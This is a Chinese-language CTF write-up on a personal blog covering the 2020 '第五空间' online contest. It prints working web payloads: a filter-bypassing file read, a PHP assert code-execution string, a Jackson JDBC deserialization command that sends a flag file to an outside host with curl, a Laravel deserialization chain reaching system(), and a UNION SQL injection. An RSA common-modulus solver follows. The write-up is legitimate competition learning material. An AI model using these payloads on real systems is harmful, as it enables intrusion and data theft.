@@ -1,0 +1,187 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <title>第五空间线上赛</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet", href="/./css/style.css">
+<link rel="shortcut icon", href="/../../../../favicon.ico">
+<link rel="apple-touch-icon", href="/./apple-touch-icon.png">
+
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+    </head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Altm4nz's blog</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Altm4nz's blog</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                
+                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
+                <p></p>
+                <h4>WEB划水选手</h4>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        第五空间线上赛
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            June 24, 2020 0:06 PM
+                        </div>
+
+                        
+                            <div class="al_page_content_info">
+                                885 words
+                            </div>
+                        
+
+                        
+                            <div class="al_page_content_info">
+                                4 minutes read
+                            </div>
+                            <div class="al_page_content_info">
+                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                            </div>
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#do-you-know"><span class="toc-text">do you know</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hate-php"><span class="toc-text">hate-php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zzm’s-blog"><span class="toc-text">zzm’s blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#laravel"><span class="toc-text">laravel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#美团外卖"><span class="toc-text">美团外卖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#roby"><span class="toc-text">roby</span></a></li></ol></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>只能说题目质量比去年好一些<a id="more"></a></p>
+<h2 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>看到$poc是通过QUERY_STRING获取的，显然url编码绕过。<br>再看xxe.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路清晰，通过index.php来访问xxe.php造成xxe攻击。<br>准备利用gopher协议向xxe发post包，在构造过程中，post包数据带有file字眼，在第一层被过滤了，用urlencode绕过。<br>然后突然发现。。直接用file协议读文件不就完了？</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">121.36</span>.<span class="number">64.91</span>/?<span class="symbol">%75</span>rl=a&amp;url=<span class="symbol">%66</span><span class="symbol">%69</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%3</span>a<span class="symbol">%2</span>f<span class="symbol">%2</span>f<span class="symbol">%2</span>f<span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%72</span><span class="symbol">%2</span>f<span class="symbol">%77</span><span class="symbol">%77</span><span class="symbol">%77</span><span class="symbol">%2</span>f<span class="symbol">%68</span><span class="symbol">%74</span><span class="symbol">%6</span>d<span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%2</span>f<span class="symbol">%6</span>d<span class="symbol">%61</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%2</span>e<span class="symbol">%70</span><span class="symbol">%68</span><span class="symbol">%70</span></span><br></pre></td></tr></table></figure>
+<p>看到flag.php ，于是去读flag.php拿到flag。应该非预期了，也懒得去继续构造gopher了。</p>
+<h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了一堆东西，然后塞进assert了，老套路，直接构造异或。<br>网上找的脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"cat flag.php"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);      </span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">        	<span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">        		$l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">        		<span class="keyword">continue</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终pay</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">121.36</span>.<span class="number">74.163</span>/?code=(~<span class="symbol">%8</span><span class="keyword">c</span><span class="symbol">%86</span><span class="symbol">%8</span><span class="keyword">c</span><span class="symbol">%8</span>b<span class="symbol">%9</span>a<span class="symbol">%92</span>)(~<span class="symbol">%9</span><span class="keyword">c</span><span class="symbol">%9</span>e<span class="symbol">%8</span>b<span class="symbol">%df</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>e<span class="symbol">%98</span><span class="symbol">%d1</span><span class="symbol">%8</span>f<span class="symbol">%97</span><span class="symbol">%8</span>f)</span><br></pre></td></tr></table></figure>
+
+<h2 id="zzm’s-blog"><a href="#zzm’s-blog" class="headerlink" title="zzm’s blog"></a>zzm’s blog</h2><p>提示了 jackson<br>找到相关文章<br><a href="https://www.cnblogs.com/xinzhao/p/11005419.html" target="_blank" rel="noopener">https://www.cnblogs.com/xinzhao/p/11005419.html</a><br><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a></p>
+<p>服务器上起一个fakeMysql ，然后安装好ysoserial<br>修改下payload </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://121.36.46.83/?query=&#123;<span class="number">%22</span>id<span class="number">%22</span>:[<span class="number">%22</span>com.mysql.cj.jdbc.admin.MiniAdmin<span class="number">%22</span>,<span class="number">%20</span><span class="number">%22</span>jdbc:mysql://134.175.2.73:3306/test?autoDeserialize=true<span class="number">%26</span>queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<span class="number">%26</span>user=yso_CommonsCollections7_bash<span class="number">%20</span>-c<span class="number">%20</span>curl<span class="variable">$&#123;IFS&#125;</span>http://134.175.2.73:2333/`cat<span class="variable">$&#123;IFS&#125;</span>/tmp/flag*|base64`<span class="number">%22</span>]&#125;</span><br></pre></td></tr></table></figure>
+<p>因为下划线会报错，所以用通配符去读flag，curl带出数据<br><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B/1.png" alt=""><br>解base64即可</p>
+<h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><p>代码审计发现了反序列化点，尝试了5.7.28可用的反序列化链都不行。<br>于是自己找到了新的链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        protected $formatters = ['addCollection' =&gt; 'system'];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> $route;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test</span>&#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> \<span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>\<span class="title">ImportConfigurator</span>(<span class="title">new</span> \<span class="title">Faker</span>\<span class="title">Generator</span>(), "<span class="title">ls</span>");</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功RCE</p>
+<h2 id="美团外卖"><a href="#美团外卖" class="headerlink" title="美团外卖"></a>美团外卖</h2><p><a href="http://www.zip拿到源码" target="_blank" rel="noopener">www.zip拿到源码</a><br>首先发现了一个熟悉的文件<br>/lib/webuploader/0.1.5/server/preview.php<br>存在任意文件上传，但是BAN了php，尝试php5上传，然后发现这个文件在线上环境被删了。？？？<br>继续看，登录处发现注入，但是由于waf存在无法盲注。<br>又在daochu.php找到一处带回显的注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.3.183.154/daochu.php?type=1&amp;imei=" union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,hints,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> hint <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>看到hint，给了个目录。<br>956c110ef9decdd920249f5fed9e4427 进去发现还是登录页面，套娃吗。<br>这个目录下的系统发现preview.php存在，于是上传php5后缀尝试。<br>返回了个e98a4571cf72b798077d12d6c94629.php<br><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B/2.png" alt=""><br>去访问告诉我get file ，于是</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">119.3</span>.<span class="number">183.154</span><span class="regexp">/956c110ef9decdd920249f5fed9e4427/</span>lib<span class="regexp">/webuploader/</span><span class="number">0.1</span>.<span class="number">5</span><span class="regexp">/server/</span>e98a4571cf72b798077d12d6c94629.php?file=<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure>
+<p>嗯 这题不知道在考什么。</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="roby"><a href="#roby" class="headerlink" title="roby"></a>roby</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xa1d4d377001f1b8d5b2740514ce699b49dc8a02f12df9a960e80e2a6ee13b7a97d9f508721e3dd7a6842c24ab25ab87d1132358de7c6c4cee3fb3ec9b7fd873626bd0251d16912de1f0f1a2bba52b082339113ad1a262121db31db9ee1bf9f26023182acce8f84612bfeb075803cf610f27b7b16147f7d29cc3fd463df7ea31ca860d59aae5506479c76206603de54044e7b778e21082c4c4da795d39dc2b9c0589e577a773133c89fa8e3a4bd047b8e7d6da0d9a0d8a3c1a3607ce983deb350e1c649725cccb0e9d756fc3107dd4352aa18c45a65bab7772a4c5aef7020a1e67e6085cc125d9fc042d96489a08d885f448ece8f7f254067dfff0c4e72a63557L</span></span><br><span class="line">c1=<span class="number">0x2f6546062ff19fe6a3155d76ef90410a3cbc07fef5dff8d3d5964174dfcaf9daa003967a29c516657044e87c1cbbf2dba2e158452ca8b7adba5e635915d2925ac4f76312feb3b0c85c3b8722c0e4aedeaec2f2037cc5f676f99b7260c3f83ffbaba86cda0f6a9cd4c70b37296e8f36c3ceaae15b5bf0b290119592ff03427b80055f08c394e5aa6c45bd634c80c59a9f70a92dc70eebec15d4a5e256bf78775e0d3d14f3a0103d9ad8ea6257a0384091f14da59e52581ba2e8ad3adb9747435e9283e8064de21ac41ab2c7b161a3c072b7841d4a594a8b348a923d4cc39f02e05ce95a69c7500c29f6bb415c11e4e0cdb410d0ec2644d6243db38e893c8a3707L</span></span><br><span class="line">c2=<span class="number">0xd32dfad68d790022758d155f2d8bf46bb762ae5cc17281f2f3a8794575ec684819690b22106c1cdaea06abaf7d0dbf841ebd152be51528338d1da8a78f666e0da85367ee8c1e6addbf590fc15f1b2182972dcbe4bbe8ad359b7d15febd5597f5a87fa4c6c51ac4021af60aeb726a3dc7689daed70144db57d1913a4dc29a2b2ec34c99c507d0856d6bf5d5d01ee514d47c7477a7fb8a6747337e7caf2d6537183c20e14c7b79380d9f7bcd7cda9e3bfb00c2b57822663c9a5a24927bceec316c8ffc59ab3bfc19f364033da038a4fb3ecef3b4cb299f4b600f76b8a518b25b576f745412fe53d229e77e68380397eee6ffbc36f6cc734815cd4065dc73dcbcbL</span></span><br><span class="line">e1=<span class="number">0xf4c1158fL</span></span><br><span class="line">e2=<span class="number">0xf493f7d1L</span></span><br><span class="line">s1=libnum.xgcd(e1,e2)[<span class="number">0</span>]</span><br><span class="line">s2=libnum.xgcd(e1,e2)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s1&lt;<span class="number">0</span>):</span><br><span class="line">    s1=-s1</span><br><span class="line">    c1=gmpy2.invert(c1,n)</span><br><span class="line"><span class="keyword">if</span>(s2&lt;<span class="number">0</span>):</span><br><span class="line">    s2=-s2</span><br><span class="line">    c2=gmpy2.invert(c2,n)</span><br><span class="line">m=libnum.n2s((pow(c1,s1,n)*pow(c2,s2,n)%n))</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+                </section>
+
+                
+                
+                
+
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2019/09/09/ByteCTF-WEB/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">ByteCTF_WEB</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="al_index_footer dis_flex_center">
+
+
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Power By 
+        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+    <div class="al_index_footer_item al_index_footer_extra_right">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+    </div>
+            
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+    </body>
+</html>
+        
